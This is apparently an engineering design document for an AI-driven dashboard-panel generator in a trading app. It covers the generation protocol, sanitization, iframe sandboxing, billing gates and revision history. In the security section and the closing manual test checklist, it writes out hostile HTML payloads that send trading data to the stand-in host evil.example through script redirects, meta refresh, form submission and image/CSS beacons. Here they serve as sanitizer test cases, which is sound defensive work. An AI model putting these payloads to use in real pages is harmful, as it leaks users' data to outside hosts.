# Vibe Coding Panel Studio

The real, current contract behind the AI Assistant's Panel Builder tab: how a natural-language
request becomes a real, streamed AI code generation, how the result is sandboxed and previewed,
how it becomes durable revision history, and how a revision is explicitly applied to a trader's
dashboard. `ARCHITECTURE.md` §7.14 links here for the detailed contract; this document is the
canonical source for it.

## Canonical path

```
PanelBuilderTab (navrya-src/aiAssistantView.jsx)
  -> POST /api/ai/panel-builder/generate, SSE (server/pattern-ai-server.mjs's panelBuilderGenerate())
       provider dispatch: callOpenAIStreaming() / callAnthropicStreaming()
       validation: navrya-src/dashboardPanelBuilder.js's parseGeneration()
  -> POST /internal/panel-artifacts/revisions (server/community/routes.internal.mjs, secret-gated)
  -> repo.panelStudioArtifacts.createRevision() (server/db/panel-studio-repo.{pg,memory}.mjs)
-- separately, ordinary session-cookie CRUD --
GET/POST /api/sync/panel-studio/artifacts/... (server/community/routes.panel-studio.mjs)
-- applying to the dashboard --
dashboardView.addArtifactPanel() -> loadBoard/saveBoard's existing `custom` map
  -> ArtifactPanelSlot renders via navrya-src/dashboardPanelSandbox.jsx's SandboxedDashboardPanel
```

## Coding-engine identity (`navrya-src/codingEngine.js`)

"Codex" and "Claude Code" are UX coding-profile identities layered on top of the real, existing
OpenAI/Anthropic calls this repo already makes. They are **never** a real external coding-agent
process, **never** an invented model id, and the UI/SSE protocol always carry the real underlying
`provider`/`model` alongside the profile label (e.g. "Codex · OpenAI · GPT-5.6 Luna").

```js
openai    -> { id: 'codex',       label: 'Codex' }
anthropic -> { id: 'claude-code', label: 'Claude Code' }
anything else -> null   // fails closed - never a guessed/default mapping
```

`resolveCodingEngine()` is imported both by the Studio UI (optimistic client-side chip) and by
`server/pattern-ai-server.mjs` (the authoritative SSE `engine` event and the 400-reject gate for
an unsupported `provider`) - one deterministic source, so the two can never disagree.

The Studio never offers its own independent provider/model picker. It always follows the trader's
real, active AI Assistant setting (`window.TradeJournalAISettingsStore.activeProvider()`/
`activeModel()`, the Keys tab), re-reading it live on `'tradejournal:ai-settings-changed'`. **Post-
launch correction:** an earlier version defaulted an unrecognized/unsupported active provider to
`SUPPORTED_PROVIDERS[0]` (effectively OpenAI) and let the trader pick a different provider/model
independently in this tab alone - meaning a real, billed request could go out under a coding-engine
label the trader never actually chose, and the server had no way to know the two had diverged. The
Studio now shows an honest, disabled unsupported-provider `Notice` and refuses to generate at all
when the active provider has no real coding-engine mapping (only openai/anthropic ship one), rather
than silently substituting a provider. `provider`/`model` sent to the server are always exactly what
the trader's real active setting says; the server independently re-validates both via
`resolveCodingEngine()` regardless of what the client sends.

## Target manifest (`navrya-src/panelStudioTargets.js`)

The one place that decides which application surfaces AI-generated code is allowed to touch. V1
enables exactly one entry, `dashboard.panel`. A future target (`session.panel`, `report.widget`, a
reviewed UI-change proposal) requires a real, already-implemented `promptBuilderModule`,
`sandboxModule`, `bridgeMethods` list, and `applyAdapter` before it can be added here with
`enabled: true` - never a boolean flip alone. Migration `076_panel_studio_artifacts.sql`'s own
`CHECK (target IN ('dashboard.panel'))` is the matching server-side, defense-in-depth backstop.

## Generation prompt and render contract (`dashboard.panel`)

`navrya-src/dashboardPanelBuilder.js` builds the real instruction sent to the provider
(`buildGenerationPrompt()`), server-side, from the trader's short raw request text - untrusted
data wrapped by, and never able to override, this module's own system policy. The contract (v2):

- Output **one** self-contained HTML fragment - no markdown fences, no prose, no
  `<html>`/`<head>`/`<body>` wrapper, and **no `<script>` tag of any kind**. The fragment is
  inserted directly as markup; the model never writes code, only display markup.
- Elements/attributes are restricted to an explicit allowlist (`navrya-src/panelSafeRender.js`'s
  `ALLOWED_TAGS`: plain structural/typographic tags, tables, and a `data:`-only `<img>` - no
  `<script>`, `<meta>`, `<form>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<style>` block, or
  `<a>`; attributes: `class`, `style` with no `url()`/`@import`, `title`, `data-navrya-bind`,
  `data-navrya-each`). Anything outside this allowlist is silently removed before the fragment is
  ever rendered - not advice the model is asked to follow, an enforced content rebuild.
- The **only** way to show a real, live value is `data-navrya-bind="<path>"` on an allowed
  element, resolved against `DASHBOARD_PANEL_BIND_SCHEMA` (`navrya-src/dashboardPanelBridgeDoc.js`)
  - an explicit, fixed allowlist of legal paths, never a generic object walk. A path outside that
  exact list always renders empty. A real **list** (open positions, pattern stats, psychology tags)
  uses `data-navrya-each="<path>"` on a container with exactly one child as the row template,
  repeated once per real item with `data-navrya-bind` resolved against that item.
- No price/candle data, no news feed, no access to any other site or service, no way to read the
  trader's identity/email/API keys/sessions/wallet balance.
- Theme via the 8 forwarded CSS custom properties (`--char-accent`, `--text-primary`, etc.).
- User-visible text in the trader's own language (fa/ar/en/es).
- Source capped at 12 KB (`MAX_SOURCE_BYTES`); the model is told this exact budget.
- **Honesty rule:** a request needing data this environment does not have (live prices, account
  balances, wallet data, another trader's identity) must be refused with exactly
  `NAVRYA_UNAVAILABLE: <one short sentence>` - never a fabricated/mocked value, and never a
  `data-navrya-bind` path outside the real schema either.
- A revision request includes the previous source and asks for the complete updated fragment, not
  a diff. **The previous source is always loaded and ownership-verified server-side** (`artifactId`
  looked up via `GET /internal/panel-artifacts/:artifactId?userId=...`, 404 if missing, 403 if it
  belongs to someone else) - `panelBuilderGenerate()` never uses a client-supplied `previousSource`
  string. A browser sending one is simply ignored; a client sending a foreign `artifactId` gets
  `404 PANEL_STUDIO_ARTIFACT_NOT_FOUND` before any provider call, never a stream.

`parseGeneration()` (also imported server-side, the persist-gate) strips one wrapping code fence,
checks the unavailable marker first, and refuses a reply with no HTML markup at all as prose. It
does **not** sanitize - sanitization happens once, at render time, in `panelSafeRender.js`, the
same code path for a fresh generation, a restored old revision (including a legacy v1 revision -
see below), and a trader's own manual edit; there is exactly one place a real browser ever turns
this stored text into DOM, and it is always this one.

## Render security model (`navrya-src/panelSafeRender.js` + `dashboardPanelSandbox.jsx`)

### The finding that drove the v2 redesign

The v1 design let a generated panel run real `<script>` inside a `sandbox="allow-scripts"` iframe
and call a live `navrya.getX()` bridge API for real trading data from that script - hardened,
across two review passes, with an opaque origin, a strict CSP, a `MessageChannel`-based transport
(instead of bare `postMessage`), and a guard that stopped a panel the instant it self-navigated a
second time. A further security review found that hardening could not be made sufficient by
hardening the transport any further, because the problem was never the transport:

- A `sandbox="allow-scripts"` browsing context **can always navigate itself** to an arbitrary URL.
  The `sandbox` attribute only ever restricts navigating *other* browsing contexts; self-navigation
  is permitted by design, and no shipped CSP directive blocks it (the draft `navigate-to` has no
  real browser implementation to rely on).
- Once a panel has real data in its own script scope - however it got there, including by reading
  it back out of its own DOM after the parent wrote it there, which no bridge-transport hardening
  touches at all - nothing on the client can prove it will never carry that data along its own
  outbound navigation (in the URL, in a form POST, ...).

This is a structural limitation of running attacker-influenced script in a browser at all, not a
gap in any one implementation detail, and no known browser primitive closes it while still letting
that script run. Concretely: a panel can `await navrya.getTradeSummary()`, hold the result, and
only *afterward* call `location.href = 'https://evil.example/?d=' + JSON.stringify(data)` - the
MessageChannel fix (still real, and still the right fix for the narrower "keep answering a
navigated-away frame" bug it targeted) does nothing to stop this, because the data already left the
bridge before the navigation ever happened.

### The fix actually applied

A generated panel never receives **both** script execution **and** real data, ever, full stop:

1. **Content rebuild, not a blacklist.** The model's raw HTML fragment is tokenized and rebuilt
   from an explicit tag/attribute allowlist by `panelSafeRender.js` - `<script>`, `<meta>`,
   `<form>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, every `on*` handler attribute, every
   `javascript:`/`vbscript:` URL, and every non-`data:` image source are simply not in the
   allowlist, so they never reach the output. The sanitizer does not scan the original bytes for
   "bad" substrings (the classic source of sanitizer bypasses); it re-serializes only what it
   explicitly recognized as safe.
2. **Data never becomes markup.** The only way a panel displays a live value is
   `data-navrya-bind="<path>"`, resolved against a fixed per-target schema and written **only** as
   escaped text content - the model's own markup inside that element is discarded, not merged with
   it. `data-navrya-each="<path>"` repeats one row template per real list item the same way.
3. **A hard platform guarantee, not a policy.** The already-safe document renders in an iframe with
   `sandbox="allow-same-origin"` and deliberately **no** `allow-scripts` - independent of
   `panelSafeRender.js`'s own correctness, the browser itself refuses to execute anything in that
   document, full stop. (`allow-same-origin` without `allow-scripts` is safe: same-origin access is
   only exploitable by script, and there is none in this document. It is also what lets the parent
   read the frame's real content height directly via `frame.contentDocument`, with no bridge needed
   for that either.) The document's CSP also carries an explicit `script-src 'none'`, defense in
   depth independent of the sandbox attribute.

With no script capability, self-navigation is not discouraged, it is **impossible** - there is no
code left in the document able to call `location.href`/`location.replace`/`window.open`. Static,
script-free navigation primitives (`<meta http-equiv="refresh">`, `<form action>`) are additionally
removed by the allowlist too, independent of whatever the sandbox attribute does or does not do to
them on its own - this design never relies on one mitigation alone. Static, script-free *beacon*
primitives (a remote `<img src>`, a CSS `url()` background) are removed the same way.
`tests/panel-safe-render.test.mjs` proves all of this dynamically, against the real sanitizer, for
every hostile technique named above plus tokenizer-confusion attempts (malformed tags, quoted `>`,
double-fencing) and a `data-navrya-bind`/`data-navrya-each` path outside the schema (including a
`__proto__`-shaped path, which never reaches `Object.prototype` because paths are matched by exact
allowlist membership, never used as a dynamic property lookup on their own).

### Honest trade-off

A panel can no longer run its own script - no custom interactivity, no client-computed values, no
`navrya.onUpdate()` callback. It is a live, reactively re-rendered data **display**, not a live
program. This is a deliberate, disclosed scope reduction (the brief that drove this redesign
explicitly authorized it: "remove live bridge data from executable generated code" and/or "move to
a validated declarative/schema-based rendering model" - this design does both at once, since data
can never safely reach a document that can also execute code). `useDashboardBridgeSnapshot`'s
`pulse` still drives a genuine, real re-render with fresh values on every real trade/pattern/
psychology-education change event - it now triggers a document rebuild (a cheap iframe reload of a
small static document) instead of a live in-page push, since there is no running script left inside
the frame to push an update *to*.

### Legacy (v1) revisions

`BRIDGE_VERSION` bumped 1 → 2 at the same time as this redesign. A revision stored under v1 (its
source calls `navrya.getTradeSummary()` from a `<script>` tag) still displays - the sanitizer drops
the `<script>` tag on render exactly like any other disallowed content, the same as any other
generated panel that happened to include one - so it shows stale/empty data (no `data-navrya-bind`
attributes exist in that old markup) until the trader regenerates or edits it. This is an honestly
degraded outcome for a capability that no longer exists, never a crash and never a fabricated
value.

### Data contract

`buildDashboardBridgeSnapshot(character)` is the read-only data contract - aggregate,
already-visibly-rendered trading-activity facts only, sourced from the same global stores the
existing Dashboard catalog panels already read synchronously
(`window.TradeJournalTradeStore`/`TradeJournalPatternStore`/`TradeJournalPsychologyStore`). It
never includes user identity/email, API keys, sessions/tokens, wallet balances, or raw
images/blobs. **Known limitation:** XP/level fields (`TradeJournalAccountProfileStore`) are
intentionally omitted from v1 pending confirmation that store's API is genuinely synchronous.
`useDashboardBridgeSnapshot(character)` refreshes this snapshot and bumps a `pulse` counter on the
same real trade/pattern/psychology-education change events the rest of the Dashboard already
reacts to, so both the Studio's own preview column and an applied board panel
(`dashboardView.jsx`'s `ArtifactPanelSlot`) stay live instead of freezing at first mount.

### Shared with the Analysis Workspace sandbox

`panelSafeRender.js` is new, generic, security-critical infrastructure with no per-target behavior
of its own, and is shared, unmodified, by both `dashboardPanelSandbox.jsx` and the pre-existing
Analysis Workspace sandbox (`navrya-src/analysisWorkspacePanelRuntime.jsx`, own schema:
`ANALYSIS_WORKSPACE_BIND_SCHEMA` in `analysisWorkspaceBridgeDoc.js`) - one well-tested
implementation, not two that could quietly drift apart. The two React runtime **components**
remain independent per the pre-existing precedent (`analysisWorkspacePanelRuntime.jsx`'s own test,
`tests/analysis-workspace-panel.test.mjs`, still asserts literal properties of that file's own
source, now updated for the same v2 redesign, applied to both targets at the same time).

## SSE generation protocol (`POST /api/ai/panel-builder/generate`)

The only streaming route in this gateway - every other route here does one `await fetch()` then
one JSON write. Not `EventSource` (this is a POST with a JSON body) - the client uses `fetch()` +
a manual `response.body.getReader()` SSE-frame parser, with an `AbortController` wired to Cancel.

| Event | Payload | When |
|---|---|---|
| `started` | `{requestId}` | after target/prompt/provider validation, the independent entitlement gate, and previous-source ownership verification all pass |
| `engine` | `{codingEngineId, codingEngineLabel, provider, model}` | immediately after, before the first provider byte |
| `delta` | `{text}` | once per real upstream chunk, incremental, never batched or faked |
| `validating` | `{}` | once the upstream stream itself completes, before parse/size checks |
| `complete` | `{artifact, revision}` | only after validation **and** persistence both succeed |
| `error` | `{code, message}` | `PROVIDER_ERROR`, `GENERATION_UNAVAILABLE`, `GENERATION_EMPTY`, `GENERATION_TOO_LARGE`, `PERSIST_FAILED`; terminal, always followed by `response.end()` |

A request that fails target/prompt/provider validation, the entitlement gate, or previous-source
ownership never opens an SSE stream at all - it gets a plain `4xx` JSON body
(`PANEL_STUDIO_TARGET_UNSUPPORTED`/`PANEL_STUDIO_PROMPT_REQUIRED`/`PANEL_STUDIO_PROVIDER_UNSUPPORTED`/
`PANEL_STUDIO_NOT_ENTITLED`/`PANEL_STUDIO_ARTIFACT_NOT_FOUND`), never a half-open stream.

**No partial or cancelled source is ever persisted, and no partial/streamed source is ever
executed** - this is structural, not a check-then-hope, on both the server and client:

- The internal persistence bridge call (`POST /internal/panel-artifacts/revisions`) is reachable
  only after `parseGeneration()`/size checks both succeed inside the handler.
- The handler (`panelBuilderGenerate()`) re-checks the client-disconnect signal at three points
  past the initial provider call - immediately after the upstream stream resolves, immediately
  before persistence, and immediately after persistence returns - not only once. This closes a
  real gap an earlier version had: a disconnect landing in the (non-trivial) gap between "the
  upstream stream finished" and "the internal persistence call actually returned" used to be able
  to race a revision into existence for a caller who was already gone. The internal persistence
  fetch itself is also given the same composed abort signal, so an in-flight persistence call is
  cancelled too, not just skipped-around.
  `tests/ai-panel-builder-sse.test.mjs` proves both the original mid-stream disconnect case and this
  distinct post-stream-completion race.
- On the client, `aiAssistantView.jsx`'s Preview column never mounts `streamText` (the live,
  in-progress SSE delta accumulation) into `SandboxedDashboardPanel` - a `previewSource` variable
  is always `''` while a generation is streaming, regardless of edit mode. Streamed deltas are
  visible only in the Code pane, as inert text, never executed. The Preview column only ever mounts
  a `source` that is either a fully validated, already-persisted revision (returned by the SSE
  `complete` event) or the trader's own local, not-yet-saved manual edit under "Preview changes"
  (which likewise never touches the network or the streaming path).

## Entitlement and billing

`aiPanelBuilder` is an existing plan feature flag (`server/commercial/commercial-defaults.mjs`'s
`PLAN_DEFAULTS`: `false` for free/plus/pro, `true` for personalized) - the same flag the Analysis
Workspace's own panel builder already reads client-side. The client-side check
(`aiAssistantView.jsx`'s `entitled` prop, fetched once from `/api/sync/subscriptions` +
`/api/sync/subscriptions/catalog`, the same two endpoints this screen already used for its
byok/premiumModels gates) is **UX only**.

There are two independent server-side checks, and they are not interchangeable:

1. **The authoritative feature gate**, inside `panelBuilderGenerate()` itself
   (`server/pattern-ai-server.mjs`): an unconditional call to
   `GET /internal/entitlements/:userId` (`resolveUserEntitlements()`), checked before
   `writeSseHeaders()`, before provider-key resolution, and before any provider request. This is
   the one gate that always runs, on every call, regardless of billing configuration or BYOK -
   rejecting with `403 PANEL_STUDIO_NOT_ENTITLED`, a plain JSON body, never a half-open SSE stream.
   **Post-launch correction:** an earlier version of this document (and of the code) treated
   `reserveForAiCall()`'s own entitlement check, below, as this route's authoritative gate. It was
   not: the dispatcher only calls `reserveForAiCall()` when
   `billedFeature && !isByok && aiWalletEnforced()` - so with wallet enforcement off (this
   repo's own default; `AI_WALLET_ENFORCED` must be explicitly set to `'true'`) or with a
   client-supplied `apiKey` (BYOK), that check never ran at all, and a Free/Plus/Pro-plan trader
   could reach real, billed provider calls the plan matrix says they should never see. The
   unconditional check above is the fix; `tests/ai-panel-builder-sse.test.mjs` proves the gate
   fires for a Free-plan user even with a BYOK key present and with wallet enforcement unset, and
   still lets a genuinely entitled user through under the same conditions.
2. **The billing/wallet-reservation path**, `server/commercial/wallet-service.mjs`'s
   `reserveForAiCall()`, still checks `entitlements.features[feature]` too (for any `feature` name
   that is itself a real `features.*` key), but only runs when wallet enforcement is actually on
   and the call is not BYOK - it governs whether a call is metered/charged against the platform's
   own wallet, not whether the feature is allowed at all. Billing feature name: `'aiPanelBuilder'`,
   wired into `pattern-ai-server.mjs`'s `AI_BILLED_ROUTES` map exactly like every other billed
   route.

## Artifact/revision lifecycle

Two tables (migration `076_panel_studio_artifacts.sql`): `panel_studio_artifacts` (one row per
panel, `status` draft/ready/applied/archived, `current_revision_id`, `applied_revision_id`) and
`panel_studio_revisions` (append-only, `revision_number`, `source`, `source_kind`
generated/manual-edit/restore, provider/model/coding-engine attribution). A revision is **never**
mutated in place.

- **`current_revision_id`** is whatever the Studio is showing/editing right now - advances on
  every generation, manual edit, or restore.
- **`applied_revision_id`** is set **only** by the explicit "Apply to dashboard" action. These two
  pointers are deliberately independent: iterating on an already-applied panel never silently
  changes what is live on the dashboard, and generation finishing never applies anything by
  itself.
- **Restore** is not a separate code path - it is `createRevision()` with
  `sourceKind: 'restore'` and `restoredFromRevisionId` set; the server loads that past revision's
  source itself (never trusting a client-resent copy) and writes it as a **brand-new** top
  revision.
- **Optimistic concurrency**: `createRevision()` accepts a `baseRevisionId` and, inside a row-locked
  transaction (`SELECT ... FOR UPDATE`), rejects with `409 REVISION_CONFLICT` if it does not match
  the artifact's real `current_revision_id` - this repo's existing pessimistic-lock-plus-
  precondition idiom (`conversationScenarios.publish()`/`rollback()`), not a client-side ETag
  mechanism.
- **Applying to the dashboard** is the one action that changes what a trader actually sees. The
  Studio calls `POST /api/sync/panel-studio/artifacts/:id/apply` first and only calls
  `dashboardView.addArtifactPanel()` (which writes a small `{title, kind:'artifact', artifactId,
  revisionId}` entry into the same `custom` board map the legacy free-text panels already use -
  `resolveCustomEntry`/`panelBody` grew an additive `kind === 'artifact'` branch; the legacy
  `{title, desc}` shape is untouched and never auto-converted) if that call actually succeeded.
  **Post-launch correction:** an earlier version added the local board entry unconditionally,
  without checking the apply call's response - a failed or session-expired apply (network error,
  expired cookie, ownership/archived-state rejection) could leave a dashboard slot pointing at a
  revision the server never actually recorded as applied. `applyToDashboard()` now checks
  `response.ok` and surfaces a `Notice` with the real error instead. Re-applying a newer revision of
  an already-on-board artifact reuses the same board slot id instead of duplicating the panel.

## Future targets

A future target (`session.panel`, `report.widget`, a reviewed application-wide UI-change proposal)
must, before it can be enabled:

1. Register a real `panelStudioTargets.js` entry (not merely flip `enabled`).
2. Provide its own narrow, read-only capability/data bridge - never generic app-state access.
3. Provide its own source/schema validator.
4. Provide its own preview strategy.
5. Provide a user-visible diff for any non-generation change.
6. Require an explicit confirmation gate before anything is applied.
7. Provide a reversible apply/rollback path.
8. Be server-side authorized and auditable, the same way `dashboard.panel` is today.

Future application-wide UI changes are proposal/review artifacts or allowlisted adapter
operations - never arbitrary generated-code access to the app runtime, repository source, APIs, or
user data.

## Known limitations (v1)

- The Diff tab is a whole-revision side-by-side comparison, not a real line/token diff algorithm.
- No pagination on an artifact's revision list.
- No hard-delete route - archive/unarchive only, so an applied dashboard slot can never be
  orphaned by deleting the artifact it points at.
- `buildDashboardBridgeSnapshot` omits XP/level fields pending confirmation of a synchronous read
  path.
- A streamed generation's `409 REVISION_CONFLICT` surfaces to the client only as a generic
  `PERSIST_FAILED` SSE error, not a distinct conflict message.
- The client sends only the trader's short raw request text, never a pre-built instruction - the
  server is the sole author of what actually reaches the provider.
- No admin moderation/visibility surface for generated panel source.
- **A panel cannot run its own script at all (v2 scope reduction)** - no custom interactivity
  (a collapsible section, a client-side counter), no computed/derived values, no
  `navrya.onUpdate()` callback. See "Render security model" above for why this trade-off, not a
  harder-to-bypass sandbox, is what actually closes the self-navigation exfiltration path: a
  document that can execute script can never be proven not to exfiltrate real data it has already
  received, no matter how the data-access transport itself is hardened.
- A revision stored under the retired v1 protocol (`BRIDGE_VERSION` 1, a `<script>` calling
  `navrya.getTradeSummary()`) still displays, but its `<script>` is dropped on render like any other
  disallowed content, so it shows stale/empty data until regenerated or edited - an honest
  degradation, not a crash or a silent fabrication.
- `data-navrya-bind`/`data-navrya-each` only bind scalar leaf values and flat per-item list fields
  from a fixed schema - there is no computed/derived display value (a percentage the model itself
  calculates, for example), since that would require script. The model can only place the schema's
  own real fields, as-is, into its layout.

## Manual hostile-panel verification checklist

`tests/panel-safe-render.test.mjs` proves the sanitizer's output is inert against every technique
below at the string level, in Node - real, but not the same as a browser actually rendering the
final `srcDoc` inside the real `<iframe sandbox="allow-same-origin">`. No browser automation was
run for this pass (not authorized); this checklist is what to actually click through once someone
is available to do it. For each row: open the Studio, paste the literal HTML into "Edit source"
(bypassing generation, since the model is instructed never to write it, but the render path must
still be safe against it regardless of where the text came from), Preview, and confirm the outcome
column - never take "nothing visibly happened" alone as proof; also check the browser's Network tab
for any request to `evil.example`, and DevTools' Elements panel for the panel's real rendered DOM
(look for a `<script>`/`<meta>`/`<form>` element - there should be none).

| # | Paste this as the panel source | Expected outcome |
|---|---|---|
| 1 | `<div data-navrya-bind="tradeSummary.totalTrades">?</div><script>location.href='https://evil.example/?d='+document.title</script>` | The real trade count renders; no navigation happens; Network tab shows no request to evil.example; Elements panel shows no `<script>` |
| 2 | `<script>location.replace('https://evil.example')</script>` | No navigation; iframe still shows the rest of the panel (or an empty body) |
| 3 | `<meta http-equiv="refresh" content="0;url=https://evil.example">` | No navigation after the panel loads |
| 4 | `<form action="https://evil.example/collect"><input name="d" value="leak"><script>document.forms[0].submit()</script></form>` | No request to evil.example; no `<form>` in the rendered Elements panel |
| 5 | `<img src="https://evil.example/beacon.gif?d=leak">` | No request to evil.example in the Network tab; no broken-image icon side effect worth worrying about |
| 6 | `<div style="background:url(https://evil.example/beacon.png)">x</div>` | No request to evil.example; the `style` attribute is either absent or stripped of the `url(...)` |
| 7 | `<div data-navrya-bind="tradeSummary.totalTrades">?</div><script>navrya && navrya.getTradeSummary && navrya.getTradeSummary().then(d=>location.href='https://evil.example/?d='+JSON.stringify(d))</script>` (the pre-v2 "request then navigate" case) | The real trade count still renders via the bind attribute; no navigation; confirms there is no `navrya` global left to call at all (`typeof window.navrya === 'undefined'` in DevTools console run against the iframe, if reachable) |
| 8 | `<a href="javascript:location.href='https://evil.example'">click me</a>` | No visible link at all (anchors are not in the allowlist) |
| 9 | Apply one of the above to the real Dashboard board (not just Preview) and reload the Dashboard page | Same result - no navigation, no network request, on the applied board panel too, not only in the Studio's own preview |

If any row does not match its expected outcome, that is a genuine regression in
`navrya-src/panelSafeRender.js` (or in how `dashboardPanelSandbox.jsx`/`analysisWorkspacePanelRuntime.jsx`
wire the iframe's `sandbox` attribute) and should block release.
